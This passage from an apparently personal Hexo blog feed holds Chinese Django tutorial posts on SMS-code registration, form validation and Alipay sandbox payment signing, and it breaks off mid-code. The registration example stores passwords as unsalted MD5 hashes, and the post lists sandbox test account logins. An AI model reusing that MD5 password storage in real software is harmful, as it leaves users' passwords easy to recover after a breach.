class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">sendSmsRemind</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> $smsBtn = $(<span class="string">'#btnSms'</span>);</span><br><span class="line">    $smsBtn.prop(<span class="string">'disabled'</span>,<span class="literal">true</span>);</span><br><span class="line">    <span class="keyword">var</span> time = <span class="number">60</span>;</span><br><span class="line">    <span class="keyword">var</span> remind = setInterval(<span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">        $smsBtn.val(time + <span class="string">'秒重新发送'</span>);</span><br><span class="line">        time = time - <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">if</span> (time &lt; <span class="number">1</span>)&#123;</span><br><span class="line">            clearInterval(remind);</span><br><span class="line">            $smsBtn.val(<span class="string">'点击获取验证码'</span>).prop(<span class="string">'disabled'</span>,<span class="literal">false</span>);</span><br><span class="line">        &#125;</span><br><span class="line">  &#125;,<span class="number">1000</span>)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="1-10实现注册"><a href="#1-10实现注册" class="headerlink" title="1.10实现注册"></a>1.10实现注册</h3><h4 id="1-10-1-按钮绑定点击事件-收集数据信息-amp-发送ajax请求"><a href="#1-10-1-按钮绑定点击事件-收集数据信息-amp-发送ajax请求" class="headerlink" title="1.10.1 按钮绑定点击事件,收集数据信息 &amp; 发送ajax请求"></a>1.10.1 按钮绑定点击事件,收集数据信息 &amp; 发送ajax请求</h4><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">bindClickSubmit</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    $(<span class="string">'#btnSubmit'</span>).click(<span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="comment">//搜集表单的数据(每一个字段的数据)</span></span><br><span class="line">        <span class="comment">// $("#regForm").serialize() 所有字段的数据  包括 csrf token字段</span></span><br><span class="line">        <span class="comment">//通过ajax发送到后台</span></span><br><span class="line">        $.ajax(&#123;</span><br><span class="line">            url:<span class="string">"&#123;% url 'register' %&#125;"</span>,</span><br><span class="line">            type:<span class="string">"POST"</span>,</span><br><span class="line">            data:$(<span class="string">"#regForm"</span>).serialize(),</span><br><span class="line">            success:<span class="function"><span class="keyword">function</span> (<span class="params">res</span>) </span>&#123;</span><br><span class="line">                <span class="built_in">console</span>.log(res);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;)</span><br><span class="line">    &#125;)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="1-10-2-校验每个字段的信息"><a href="#1-10-2-校验每个字段的信息" class="headerlink" title="1.10.2  校验每个字段的信息"></a>1.10.2  校验每个字段的信息</h4><p>通过钩子对每个字段进行校验</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">RegisterForm</span><span class="params">(BootSrtapForm,forms.ModelForm)</span>:</span></span><br><span class="line">        ......</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Meta</span>:</span></span><br><span class="line">        ......</span><br><span class="line">        </span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">clean_username</span><span class="params">(self)</span>:</span></span><br><span class="line">        username = self.cleaned_data[<span class="string">'username'</span>]</span><br><span class="line"></span><br><span class="line">        exists = models.UserInfo.objects.filter(username=username).exists()</span><br><span class="line">        <span class="keyword">if</span> exists:</span><br><span class="line">            <span class="keyword">raise</span> ValidationError(<span class="string">'用户名已存在'</span>)</span><br><span class="line">        <span class="keyword">return</span> username</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">clean_email</span><span class="params">(self)</span>:</span></span><br><span class="line">        email = self.cleaned_data[<span class="string">'email'</span>]</span><br><span class="line">        exists = models.UserInfo.objects.filter(email=email).exists()</span><br><span class="line">        <span class="keyword">if</span> exists:</span><br><span class="line">            <span class="keyword">raise</span> ValidationError(<span class="string">'邮箱已存在'</span>)</span><br><span class="line">        <span class="keyword">return</span> email</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">clean_password</span><span class="params">(self)</span>:</span></span><br><span class="line">        pwd = self.cleaned_data[<span class="string">'password'</span>]</span><br><span class="line">        <span class="comment"># 加密 &amp; 返回</span></span><br><span class="line">        pwd = encrypt.md5(pwd)</span><br><span class="line">        <span class="keyword">return</span> pwd</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">clean_confirm_password</span><span class="params">(self)</span>:</span></span><br><span class="line">        pwd = self.cleaned_data.get(<span class="string">'password'</span>)</span><br><span class="line">        conf_pwd = encrypt.md5(self.cleaned_data[<span class="string">'confirm_password'</span>])</span><br><span class="line">        <span class="keyword">if</span> pwd != conf_pwd:</span><br><span class="line">            <span class="keyword">raise</span> ValidationError(<span class="string">'两次密码不一致'</span>)</span><br><span class="line">        <span class="keyword">return</span> conf_pwd</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">clean_mobile_phone</span><span class="params">(self)</span>:</span></span><br><span class="line">        mobile_phone = self.cleaned_data[<span class="string">'mobile_phone'</span>]</span><br><span class="line"></span><br><span class="line">        exists = models.UserInfo.objects.filter(mobile_phone=mobile_phone).exists()</span><br><span class="line">        <span class="keyword">if</span> exists:</span><br><span class="line">            <span class="keyword">raise</span> ValidationError(<span class="string">'手机号已注册'</span>)</span><br><span class="line">        <span class="keyword">return</span> mobile_phone</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">clean_code</span><span class="params">(self)</span>:</span></span><br><span class="line">        code = self.cleaned_data[<span class="string">'code'</span>]</span><br><span class="line">        mobile_phone = self.cleaned_data.get(<span class="string">'mobile_phone'</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> mobile_phone:</span><br><span class="line">            <span class="keyword">return</span> code</span><br><span class="line"></span><br><span class="line">        conn = get_redis_connection()</span><br><span class="line">        redis_code = conn.get(mobile_phone)</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> redis_code:</span><br><span class="line">            <span class="keyword">raise</span> ValidationError(<span class="string">'验证码失效或未发送，请重新发送'</span>)</span><br><span class="line">        redis_str_code = redis_code.decode(<span class="string">'utf-8'</span>)</span><br><span class="line">        <span class="keyword">if</span> code.strip() != redis_str_code:</span><br><span class="line">            <span class="keyword">raise</span> ValidationError(<span class="string">'验证码输入错误，请重新输入'</span>)</span><br><span class="line">        <span class="keyword">return</span> code</span><br></pre></td></tr></table></figure><h4 id="1-10-2-将数据写入到数据库"><a href="#1-10-2-将数据写入到数据库" class="headerlink" title="1.10.2 将数据写入到数据库"></a>1.10.2 将数据写入到数据库</h4><p>注册的视图函数，进行校验与写入到数据库</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">register</span><span class="params">(request)</span>:</span></span><br><span class="line">    <span class="string">"""注册"""</span></span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">'GET'</span>:</span><br><span class="line">        form = RegisterForm()</span><br><span class="line">        <span class="keyword">return</span> render(request, <span class="string">'web/register.html'</span>, &#123;<span class="string">'form'</span>: form&#125;)</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 获取POST的数据</span></span><br><span class="line">    form = RegisterForm(request.POST)</span><br><span class="line">    <span class="comment"># 对数据进行校验</span></span><br><span class="line">    <span class="keyword">if</span> form.is_valid():</span><br><span class="line">        <span class="comment"># 验证通过写入数据库（密码为密文）</span></span><br><span class="line">        <span class="comment"># instance = form.save,在数库中新增一条数据，并将新增的数据复制给instance</span></span><br><span class="line">        <span class="comment">#用户表中新建一条数据（注册）</span></span><br><span class="line">        instance = form.save()</span><br><span class="line">        <span class="keyword">return</span> JsonResponse(&#123;<span class="string">'status'</span>: <span class="literal">True</span>, <span class="string">'data'</span>: <span class="string">'/login/'</span>&#125;)</span><br><span class="line">    <span class="keyword">return</span> JsonResponse(&#123;<span class="string">'status'</span>: <span class="literal">False</span>, <span class="string">'error'</span>: form.errors&#125;)</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 实现注册 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>支付宝支付</title>
      <link href="/2020/08/02/%E6%94%AF%E4%BB%98%E5%AE%9D%E6%94%AF%E4%BB%98/"/>
      <url>/2020/08/02/%E6%94%AF%E4%BB%98%E5%AE%9D%E6%94%AF%E4%BB%98/</url>
      
        <content type="html"><![CDATA[<h2 id="支付宝支付"><a href="#支付宝支付" class="headerlink" title="支付宝支付"></a>支付宝支付</h2><ul><li><p>正式环境：营业执照等信息</p><p><a href="https://opendocs.alipay.com/open/270/105899" target="_blank" rel="noopener">https://opendocs.alipay.com/open/270/105899</a></p></li><li><p>沙箱环境，模拟真实环境</p><p><a href="https://opendocs.alipay.com/open/200/105311" target="_blank" rel="noopener">https://opendocs.alipay.com/open/200/105311</a></p></li></ul><h3 id="1-申请开通沙箱环境"><a href="#1-申请开通沙箱环境" class="headerlink" title="1.申请开通沙箱环境"></a>1.申请开通沙箱环境</h3><p><img src="/" class="lazyload" data-src="http://hp256.gitee.io/blog/Django%E5%9B%BE%E7%89%87/%E6%94%AF%E4%BB%98%E5%AE%9D%E6%B2%99%E7%AE%B1%E7%8E%AF%E5%A2%83.jpg"  alt="支付宝沙箱环境"></p><p>注册成功后获得两个值：</p><ul><li>APPID</li><li>支付宝网关<ul><li><a href="https://openapi.alipaydev.com/gateway.do" target="_blank" rel="noopener">https://openapi.alipaydev.com/gateway.do</a></li></ul></li></ul><h3 id="2-生成秘钥"><a href="#2-生成秘钥" class="headerlink" title="2.生成秘钥"></a>2.生成秘钥</h3><p>秘钥用于以后对URL中添加参数进行加密和校验</p><h4 id="2-1-下载支付宝秘钥生成器"><a href="#2-1-下载支付宝秘钥生成器" class="headerlink" title="2.1 下载支付宝秘钥生成器"></a>2.1 下载支付宝秘钥生成器</h4><p>生成一对秘钥：</p><ul><li>应用公钥</li><li>应用私钥</li></ul><h4 id="2-2-上传应用公钥获取支付宝公钥"><a href="#2-2-上传应用公钥获取支付宝公钥" class="headerlink" title="2.2 上传应用公钥获取支付宝公钥"></a>2.2 上传应用公钥获取支付宝公钥</h4><p><img src="/" class="lazyload" data-src="http://hp256.gitee.io/blog/Django%E5%9B%BE%E7%89%87/%E4%B8%8A%E4%BC%A0%E5%BA%94%E7%94%A8%E5%85%AC%E9%92%A5.png"  alt="上传应用公钥"></p><p>以上操作共获得三个秘钥：</p><ul><li>应用公钥</li><li>应用私钥，对以后URL中传入的数据进行签名加密。</li><li>支付宝公钥（通过应用公钥生成），在页面支付成功后跳转回来，对于支付宝给我们传的值进行校验。</li></ul><h3 id="3-账号信息和测试app"><a href="#3-账号信息和测试app" class="headerlink" title="3. 账号信息和测试app"></a>3. 账号信息和测试app</h3><ul><li><p>卖家信息</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">买家账号xmeqkw1685@sandbox.com</span><br><span class="line">登录密码111111</span><br><span class="line">支付密码111111</span><br><span class="line">用户名称沙箱环境</span><br><span class="line">证件类型身份证(IDENTITY_CARD)</span><br><span class="line">证件号码980232196608012218</span><br><span class="line">账户余额</span><br><span class="line">99999.00</span><br></pre></td></tr></table></figure></li><li><p>商家信息</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">商家账号tqjacd1552@sandbox.com</span><br><span class="line">商户UID2088621955029063</span><br><span class="line">登录密码111111</span><br><span class="line">账户余额</span><br><span class="line">0.00</span><br></pre></td></tr></table></figure></li><li><p>APP</p><p><img src="/" class="lazyload" data-src="http://hp256.gitee.io/blog/Django%E5%9B%BE%E7%89%87/%E6%B2%99%E7%AE%B1%E7%8E%AF%E5%A2%83%E6%94%AF%E4%BB%98%E5%AE%9D.jpg"  alt="沙箱环境支付宝"></p></li></ul><h3 id="4-两种支持"><a href="#4-两种支持" class="headerlink" title="4.两种支持"></a>4.两种支持</h3><ul><li><p>SDK，写好的Python模块</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">1. 安装模块：pip install alipay-sdk-python&#x3D;&#x3D;3.3.398（不推荐）</span><br><span class="line">2. 基于模块实现功能</span><br></pre></td></tr></table></figure></li><li><p>API，提供URL</p><p><a href="https://opendocs.alipay.com/apis/api_1/alipay.trade.page.pay" target="_blank" rel="noopener">https://opendocs.alipay.com/apis/api_1/alipay.trade.page.pay</a></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1. 自己手动URL进行处理和加密</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">跳转到这个地址： 网关?参数组成</span><br><span class="line">https:&#x2F;&#x2F;openapi.alipaydev.com&#x2F;gateway.do</span><br><span class="line">参数 &#x3D; &#123;</span><br><span class="line">app_id:&quot;2014072300007148&quot;,</span><br><span class="line">method:&quot;alipay.trade.page.pay&quot;,</span><br><span class="line">format:&quot;JSON&quot;,</span><br><span class="line">return_url:&quot;支付成功后跳转到的页面&quot;,</span><br><span class="line">notify_url:&quot;同时向这个地址发送一个post请求&quot;,</span><br><span class="line">charset:&quot;utf-8&quot;,</span><br><span class="line">sign_type:&quot;RSA2&quot;,</span><br><span class="line">sign:&quot;签名&quot;,</span><br><span class="line">timestamp:&quot;2014-07-24 03:07:50&quot;,</span><br><span class="line">version:&quot;1.0&quot;,</span><br><span class="line">biz_content:&#123;</span><br><span class="line">out_trade_no:&quot;订单号&quot;,</span><br><span class="line">product_code:FAST_INSTANT_TRADE_PAY,</span><br><span class="line">total_amount:88.88,</span><br><span class="line">subject:&quot;订单标题&quot;,</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">如果支付成功之后，服务器宕机，如何处理？</span><br><span class="line">偷偷向notify_url发送请求，说支付成功，更改订单状态</span><br><span class="line">服务器宕机，支付宝访问不到，则会在24小时内不断发送该请求，直到超过24小时22分钟。一般情况下，25小时内完成8次通知（通知的间隔频率一般为：4m,10m,10m,1h,2h,6h,15h） </span><br><span class="line">网站接收到支付宝请求之后，返回数据不正确，同时。</span><br><span class="line">返回一个字符串&quot;success&quot;</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line">支付宝签名的过程：对参数进行处理，处理完成之后再和网关拼接起来</span><br><span class="line">https:&#x2F;&#x2F;openapi.alipaydev.com&#x2F;gateway.do</span><br><span class="line">params &#x3D; &#123;</span><br><span class="line">app_id:&quot;2014072300007148&quot;,</span><br><span class="line">method:&quot;alipay.trade.page.pay&quot;,</span><br><span class="line">format:&quot;JSON&quot;,</span><br><span class="line">return_url:&quot;支付成功后跳转到的页面&quot;,</span><br><span class="line">notify_url:&quot;同时向这个地址发送一个post请求&quot;,</span><br><span class="line">charset:&quot;utf-8&quot;,</span><br><span class="line">sign_type:&quot;RSA2&quot;,</span><br><span class="line">sign:&quot;签名&quot;,</span><br><span class="line">timestamp:&quot;2014-07-24 03:07:50&quot;,</span><br><span class="line">version:&quot;1.0&quot;,</span><br><span class="line">biz_content:&#123;</span><br><span class="line">out_trade_no:&quot;订单号&quot;,</span><br><span class="line">product_code:FAST_INSTANT_TRADE_PAY,</span><br><span class="line">total_amount:88.88,</span><br><span class="line">subject:&quot;订单标题&quot;,</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">1. 将参数中 文件、字节流、sign字段、值为空的参数 剔除</span><br><span class="line">params.pop(sign)</span><br><span class="line">2. 排序，对参数中所有的key进行从小到大排 sort(params)</span><br><span class="line">按照第一个字符的键值 ASCII 码递增排序（字母升序排序），如果遇到相同字符则按照第二个字符的键值 ASCII 码递增排序，以此类推。</span><br><span class="line"></span><br><span class="line">3. 将排序后的参数与其对应值，组合成“参数&#x3D;参数值”的格式，并且把这些参数用 &amp; 字符连接起来，此时生成的字符串为待签名字符串。</span><br><span class="line">代签名的字符串 &#x3D; &quot;app_id&#x3D;2014072300007148&amp;methodalipay.trade.page.pay&amp; ....&quot;</span><br><span class="line">注意：</span><br><span class="line">1.有字典应该转换为字符串</span><br><span class="line">2.字符串中间不能有空格</span><br><span class="line">json.dumps(info,separators&#x3D;(&quot;,&quot;,&quot;:&quot;))</span><br><span class="line"></span><br><span class="line">4.使用各自语言对应的 SHA256WithRSA签名函数 并 利用商户（应用）私钥对待签名字符串进行签名，并进行 Base64 编码。</span><br><span class="line">result &#x3D; 使用 SHA256WithRSA签名函数 和 商户（应用）私钥 对代签名字符串进行签名</span><br><span class="line">签名 &#x3D; 对result进行Base64编码</span><br><span class="line"></span><br><span class="line">注意：</span><br><span class="line">1.签名添加回params字典中，params[sign] &#x3D; 签名</span><br><span class="line">2.base64编码之后，内部不能有换行符</span><br><span class="line">签名.replace(&quot;\n&quot;,&quot;&quot;)</span><br><span class="line"></span><br><span class="line">5.再将所有的参数添加起来</span><br><span class="line">注意：拼接URL时候不能出现 ; , ( 等字符，提前将特殊字符转换URL转义的字符 </span><br><span class="line">form urllib.parse import quote_plus</span><br><span class="line"></span><br><span class="line">https:&#x2F;&#x2F;opendocs.alipay.com&#x2F;open&#x2F;291&#x2F;105974</span><br></pre></td></tr></table></figure></li></ul><h2 id="支付宝支付端口代码"><a href="#支付宝支付端口代码" class="headerlink" title="支付宝支付端口代码"></a>支付宝支付端口代码</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> datetime <span class="keyword">import</span> datetime</span><br><span class="line"><span class="keyword">from</span> Crypto.PublicKey <span class="keyword">import</span> RSA</span><br><span class="line"><span class="keyword">from</span> Crypto.Signature <span class="keyword">import</span> PKCS1_v1_5</span><br><span class="line"><span class="keyword">from</span> Crypto.Hash <span class="keyword">import</span> SHA256</span><br><span class="line"><span class="keyword">from</span> urllib.parse <span class="keyword">import</span> quote_plus</span><br><span class="line"><span class="keyword">from</span> urllib.parse <span class="keyword">import</span> urlparse, parse_qs</span><br><span class="line"><span class="keyword">from</span> base64 <span class="keyword">import</span> decodebytes, encodebytes</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">AliPay</span><span class="params">(object)</span>:</span></span><br><span class="line">    <span class="string">"""</span></span><br><span class="line"><span class="string">    支付宝支付接口(PC端支付接口)</span></span><br><span class="line"><span class="string">    """</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self, appid, app_notify_url, app_private_key_path,</span></span></span><br><span class="line"><span class="function"><span class="params">                 alipay_public_key_path, return_url)</span>:</span></span><br><span class="line">        self.appid = appid</span><br><span class="line">        self.app_notify_url = app_notify_url</span><br><span class="line">        self.app_private_key_path = app_private_key_path</span><br><span class="line">        self.app_private_key = <span class="literal">None</span></span><br><span class="line">        self.return_url = return_url</span><br><span class="line">        <span class="keyword">with</span> open(self.app_private_key_path) <span class="keyword">as</span> fp:</span><br><span class="line">            self.app_private_key = RSA.importKey(fp.read())</span><br><span class="line">        self.alipay_public_key_path = alipay_public_key_path</span><br><span class="line">        <span class="keyword">with</span> open(self.alipay_public_key_path) <span class="keyword">as</span> fp:</span><br><span class="line">            self.alipay_public_key = RSA.importKey(fp.read())</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">direct_pay</span><span class="params">(self, subject, out_trade_no, total_amount, return_url=None, **kwargs)</span>:</span></span><br><span class="line">        biz_content = &#123;</span><br><span class="line">            <span class="string">"subject"</span>: subject,</span><br><span class="line">            <span class="string">"out_trade_no"</span>: out_trade_no,</span><br><span class="line">            <span class="string">"total_amount"</span>: total_amount,</span><br><span class="line">            <span class="string">"product_code"</span>: <span class="string">"FAST_INSTANT_TRADE_PAY"</span>,</span><br><span class="line">            <span class="comment"># "qr_pay_mode":4</span></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        biz_content.update(kwargs)</span><br><span class="line">        data = self.build_body(<span class="string">"alipay.trade.page.pay"</span>, biz_content, self.return_url)</span><br><span class="line">        <span class="keyword">return</span> self.sign_data(data)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">build_body</span><span class="params">(self, method, biz_content, return_url=None)</span>:</span></span><br><span class="line">        data = &#123;</span><br><span class="line">            <span class="string">"app_id"</span>: self.appid,</span><br><span class="line">            <span class="string">"method"</span>: method,</span><br><span class="line">            <span class="string">"charset"</span>: <span class="string">"utf-8"</span>,</span><br><span class="line">            <span class="string">"sign_type"</span>: <span class="string">"RSA2"</span>,</span><br><span class="line">            <span class="string">"timestamp"</span>: datetime.now().strftime(<span class="string">"%Y-%m-%d %H:%M:%S"</span>),</span><br><span class="line">            <span class="string">"version"</span>: <span class="string">"1.0"</span>,</span><br><span class="line">            <span class="string">"biz_content"</span>: biz_content</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> return_url <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span>:</span><br><span class="line">            data[<span class="string">"notify_url"</span>] = self.app_notify_url</span><br><span class="line">            data[<span class="string">"return_url"</span>] = self.return_url</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> data</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">sign_data</span><span class="params">(self, data)</span>:</span></span><br><span class="line">        data.pop(<span class="string">"sign"</span>, <span class="literal">None</span>)</span><br><span class="line">        <span class="comment"># 排序后的字符串</span></span><br><span class="line">        unsigned_items = self.ordered_data(data)</span><br><span class="line">        unsigned_string = <span class="string">"&amp;"</span>.join(<span class="string">"&#123;0&#125;=&#123;1&#125;"</span>.format(k, v) <span class="keyword">for</span> k, v <span class="keyword">in</span> unsigned_items)</span><br><span class="line">        sign = self.sign(unsigned_string.encode(<span class="string">"utf-8"</span>))</span><br><span class="line">        <span class="comment"># ordered_items = self.ordered_data(data)</span></span><br><span class="line">        quoted_string = <span class="string">"&amp;"</span>.join(<span class="string">"&#123;0&#125;=&#123;1&#125;"</span>.format(k, quote_plus(v)) <span class="keyword">for</span> k, v <span class="keyword">in</span> unsigned_items)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># 获得最终的订单信息字符串</span></span><br><span class="line">        signed_string = quoted_string + <span class="string">"&amp;sign="</span> + quote_plus(sign)</span><br><span class="line">        <span class="keyword">return</span> signed_string</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">ordered_data</span><span class="params">(self, data)</span>:</span></span><br><span class="line">        complex_keys = []</span><br><span class="line">        <span class="keyword">for</span> key, value <span class="keyword">in</span> data.items():</span><br><span class="line">            <span class="keyword">if</span> isinstance(value, dict):</span><br><span class="line">                complex_keys.append(key)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># 将字典类型的数据dump出来</span></span><br><span class="line">        <span class="keyword">for</span> key <span class="keyword">in</span> complex_keys:</span><br><span class="line">            